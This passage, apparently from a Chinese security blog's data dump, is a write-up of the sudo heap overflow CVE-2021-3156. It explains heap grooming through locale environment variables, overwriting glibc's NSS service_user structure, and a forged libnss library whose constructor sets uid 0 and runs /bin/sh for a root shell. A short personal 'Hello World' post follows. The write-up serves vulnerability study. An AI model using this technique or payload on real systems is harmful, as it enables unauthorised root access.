&amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; //... if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; &#125;&#125;//escape meta char conditionif (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; //.. &#125; 1234567891011121314151617181920212223242526#define MODE_NONINTERACTIVE 0x00800000#define MODE_SHELL 0x00020000//parse_args.ccase &#x27;e&#x27;: if (mode &amp;&amp; mode != MODE_EDIT) usage_excl(1); mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; valid_flags = MODE_NONINTERACTIVE;//这里 break; //...case &#x27;l&#x27;: if (mode) &#123; if (mode == MODE_LIST) SET(flags, MODE_LONG_LIST); else usage_excl(1); &#125; mode = MODE_LIST; valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;//这里 //...if ((flags &amp; valid_flags) != flags) usage(1); ​ 最后作者发现了一个可以利用的地方(盲猜是通过全局搜flag找到的)，那就是如果我们去执行sudoedit，parse_args函数会自动设置MODE_EDIT，并且不会重置valid_flags，而valid_flags默认包含了MODE_SHELL。 123456789101112131415/* * Default flags allowed when running a command. */#define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)int valid_flags = DEFAULT_VALID_FLAGS; /* First, check to see if we were invoked as &quot;sudoedit&quot;. */ proglen = strlen(progname); if (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, &quot;edit&quot;) == 0) &#123; progname = &quot;sudoedit&quot;; mode = MODE_EDIT; sudo_settings[ARG_SUDOEDIT].value = &quot;true&quot;; &#125; ​ 也就是说，加入我们执行sudoedit -s，就同时兼具了MODE_SHELL|MODE_EDIT而没有MODE_RUN，因此可以成功到达漏洞点。 一个溢出demo： 1.堆溢出分析1.堆在内存中的位置 2.堆的结构 arena：通过sbrk或mmap系统调用为线程分配的堆区，按线程的类型可以分为2类： main arena：主线程建立的arena； thread arena：子线程建立的arena； bin：一个用以保存Free chunk链表的表头信息的指针数组，按所悬挂链表的类型可以分为4类: Fast bin：Fast bin 共有10个，存储了chunk size 从16到80的free chunk，这些free chunk被称作fast chunk Unsorted bin：当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。 Small bin：小于512字节的chunk称之为small chunk，small bin就是用于管理small chunk的。 Large bin：大于512字节的chunk称之为large chunk，large bin就是用于管理这些large chunk的。 PS:libc2.26 之后的 Tcache 机制 Tcache bin :类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。 区别：Max fast bins size is 0x80. Max tcache bins size is 0x410 mutex：互斥锁，防止多线程对chunk资源的竞争 Large bin： chunk：逻辑上划分的一小块内存，根据作用不同分为4类： Allocated chunk：即分配给用户且未释放的内存块； Free chunk：即用户已经释放的内存块； Top chunk：处于一个arena的最顶部的chunk Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk。 标志位： A:记录当前chunk是否属于主线程 M:记录当前chunk是否是由mmap分配 P:记录前一个chunk块是否被分配 Malloc Algorithm： 1.若malloc请求大小与tcache中某个chunk大小完全匹配，优先从tcache bins调用而不必向large bin发出请求。 2.若请求内存足够大，则调用mmap()直接向操作系统从内存中调用 3.若fast bin中有合适大小的块，则先从中分配 TO be continued…. Free Algorithm： 1.若tcache bins有空间，则优先将空闲块放入其中 2.如果块足够小，则优先放入fast bins中 TO be continued…. 从该调度算法可以看出，某个具体大小的chunk可以在tcache bins 中稳定存在一定时间并且不发生合并，这个机制可以为我们精准溢出到某个结构体前面附近提前进行占位。 漏洞利用思路：利用溢出覆写nss_library为X/X，从而加载自定义的库函数，进而get root shell。 知识背景： 1.glibc setlocalemain()函数较早调用了setlocale()函数，查阅源码我们发现此处进行了malloc操作，这样可以分配并释放几个LC环境变量（LC_CTYPE，LC_MESSAGES，LC_TIME等），这样就在Sudo的堆开头处留下了空闲的fast/tcache chunks 12345678// /src/sudo.c150: int main(int argc, char *argv[], char *envp[])151: &#123; ...171: setlocale(LC_ALL, &quot;&quot;); ...216: sudo_mode = parse_args(argc, argv, &amp;submit_optind, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add); 总之我们可以通过设置环境变量对堆进行修饰，得到指定大小的空闲chunk 并且该块在NSS结构体之前。由malloc机制不难分析出，我们控制好溢出大小很容易在tcache或者fast bins中占有该空闲块。 2.NSS（Name Service Switch）​ 每个Linux/Unix的操作系统中都有这样的一套称之为NSS的共享库来做一些解析，比如登录用户的用户名以及IP地址到域名的解析。比如对于DNS服务来说，它默认查看/etc/resolv.conf配置文件的内容进行解析，对于用户和组来说，它会默认查看/etc/passwd和/etc/group。其配置文件位于/etc/nsswitch.conf，其每行都规定了查找方法的规范，在GNU C Library里, 每个可用的SERVICE都必须有文件 /lib/libnss_SERVICE.so.1 与之对应。****也就是说，GNU将每个服务实现为不同的module(shared library)，因此可以在Linux系统中找到下列相应的共享库。** 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// 1. service_user 结构typedef struct service_user&#123;/* And the link to the next entry. */struct service_user *next;/* Action according to result. */lookup_actions actions[5];/* Link to the underlying library object. */service_library *library;/* Collection of known functions. */void *known;/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...). */char name[0];&#125; service_user;// 2. nss_load_library() 函数static int nss_load_library (service_user *ni)&#123;if (ni-&gt;library == NULL) &#123; static name_database default_table; ni-&gt;library = nss_new_service (service_table ?: &amp;default_table, // （1）设置 ni-&gt;library ni-&gt;name); if (ni-&gt;library == NULL) return -1; &#125;if (ni-&gt;library-&gt;lib_handle == NULL) &#123; /* Load the shared library. */ size_t shlen = (7 + strlen (ni-&gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, // （2）伪造的库文件名必须是 libnss_xxx.so &quot;libnss_&quot;), ni-&gt;name), &quot;.so&quot;), __nss_shlib_revision); ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); // （3）加载目标库 //continue long long function 分析代码可知：如果溢出后可以覆盖service_user结构。该结构出现在libc的nss_load_library()函数中，用于加载动态链接库。如果能覆盖service_user-&gt;name，就能指定加载我们伪造的库，利用root权限运行非root权限的库。 我们要做的就是利用溢出部分将ni-&gt;library == null，所以找到距离我们占位块最近的一个service_user结构体即可。 gdb调试技巧： search -s systemd 和 search -s mymachine 定位出现的结构体，找到位置最合适的一个。 Demo: 最后一步：伪造libnss_X/X.so.2库 Demo: 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;static int __attribute__((constructor)) ___init(void)&#123; char *argv[2] = &#123;&quot;sh&quot;, NULL&#125;; setuid(0); setgid(0); seteuid(0); setegid(0); return execve(&quot;/bin/sh&quot;, argv, NULL);&#125; 加载该库函数即可get shell. 总结基本思路是：通过输入特定环境变量，使得释放特定大小LC_ALL变量堆块占位到service_user结构体上方为目标来进行，使得service结构体加载自定义库函数。 在阅读Qualys的报告时注意到，在寻找利用点时使用了fuzz的方法，找到了三个较为稳定的利用点，这点值得以后深入了解。","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"}]},{"title":"Hello World","slug":"hello_world","date":"2021-04-08T03:20:01.320Z","updated":"2021-04-08T17:06:24.341Z","comments":true,"path":"2021/04/08/hello_world/","link":"","permalink":"http://example.com/2021/04/08/hello_world/","excerpt":"","text":"一个新的开始 “我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。” ​ 几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。 :) Hello world.","categories":[{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}],"categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"Web","slug":"Web","permalink":"http://example.com/categories/Web/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/categories/Pwn/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"},{"name":"my_space","slug":"my-space","permalink":"http://example.com/categories/my-space/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"http://example.com/tags/Web/"},{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"},{"name":"程序保护机制","slug":"程序保护机制","permalink":"http://example.com/tags/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"},{"name":"编译过程","slug":"编译过程","permalink":"http://example.com/tags/%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"},{"name":"链接","slug":"链接","permalink":"http://example.com/tags/%E9%93%BE%E6%8E%A5/"},{"name":"堆溢出","slug":"堆溢出","permalink":"http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"name":"CVE-2021-3156","slug":"CVE-2021-3156","permalink":"http://example.com/tags/CVE-2021-3156/"},{"name":"say_something","slug":"say-something","permalink":"http://example.com/tags/say-something/"}]}